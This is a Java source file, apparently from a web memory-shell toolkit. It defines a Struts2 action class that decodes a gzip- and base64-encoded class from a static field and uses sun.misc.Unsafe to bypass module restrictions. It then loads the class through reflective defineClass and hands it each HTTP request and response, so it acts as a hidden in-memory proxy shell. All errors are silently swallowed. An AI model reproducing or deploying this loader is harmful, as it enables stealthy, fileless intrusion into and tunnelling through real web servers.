package com.reajason.javaweb.memshell.shelltool.proxy;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.zip.GZIPInputStream;

public class ProxyStruts2Action {
    private static volatile Class<?> proxyHttpClass;
    private static String proxyHttpGZipBase64;

    public ProxyStruts2Action() {
    }

    public void execute() throws Exception {
        try {
            Class<?> clazz = Class.forName("com.opensymphony.xwork2.ActionContext");
            Object context = clazz.getMethod("getContext").invoke(null);
            Method getMethod = clazz.getMethod("get", String.class);
            HttpServletRequest request = (HttpServletRequest) getMethod.invoke(context, "com.opensymphony.xwork2.dispatcher.HttpServletRequest");
            HttpServletResponse response = (HttpServletResponse) getMethod.invoke(context, "com.opensymphony.xwork2.dispatcher.HttpServletResponse");
            getProxyHttpClass().newInstance().equals(new Object[]{request, response});
        } catch (Throwable ignored) {
        }
    }

    private static Class<?> getProxyHttpClass() throws Exception {
        if (proxyHttpClass == null) {
            synchronized (ProxyStruts2Action.class) {
                if (proxyHttpClass == null) {
                    byte[] bytes = gzipDecompress(decodeBase64(proxyHttpGZipBase64));
                    proxyHttpClass = reflectionDefineClass(bytes);
                }
            }
        }
        return proxyHttpClass;
    }

    private static Class<?> reflectionDefineClass(byte[] classBytes) throws Exception {
        Object unsafe = null;
        Object rawModule = null;
        long offset = 48;
        Method getAndSetObjectMethod = null;
        try {
            Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            unsafe = unsafeField.get(null);
            rawModule = Class.class.getMethod("getModule").invoke(ProxyStruts2Action.class, (Object[]) null);
            Object module = Class.class.getMethod("getModule").invoke(Object.class, (Object[]) null);
            Method objectFieldOffsetMethod = unsafe.getClass().getMethod("objectFieldOffset", Field.class);
            offset = (Long) objectFieldOffsetMethod.invoke(unsafe, Class.class.getDeclaredField("module"));
            getAndSetObjectMethod = unsafe.getClass().getMethod(
                    "getAndSetObject", Object.class, long.class, Object.class);
            getAndSetObjectMethod.invoke(unsafe, ProxyStruts2Action.class, offset, module);
        } catch (Throwable ignored) {
        }

        try {
            URLClassLoader classLoader = new URLClassLoader(
                    new URL[0], Thread.currentThread().getContextClassLoader());
            Method defineMethod = ClassLoader.class.getDeclaredMethod(
                    "defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            defineMethod.setAccessible(true);
            return (Class<?>) defineMethod.invoke(classLoader, classBytes, 0, classBytes.length);
        } finally {
            if (getAndSetObjectMethod != null && rawModule != null) {
                try {
                    getAndSetObjectMethod.invoke(unsafe, ProxyStruts2Action.class, offset, rawModule);
                } catch (Throwable ignored) {
                }
            }
        }
    }

    @SuppressWarnings("all")
    private static byte[] decodeBase64(String value) throws Exception {
        try {
            Class<?> decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, value);
        } catch (Throwable e) {
            Class<?> decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class)
                    .invoke(decoderClass.newInstance(), value);
        }
    }

    private static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream input = new GZIPInputStream(new ByteArrayInputStream(compressedData));
        try {
            byte[] buffer = new byte[4096];
            int count;
            while ((count = input.read(buffer)) > 0) {
                out.write(buffer, 0, count);
            }
            return out.toByteArray();
        } finally {
            input.close();
            out.close();
        }
    }
}
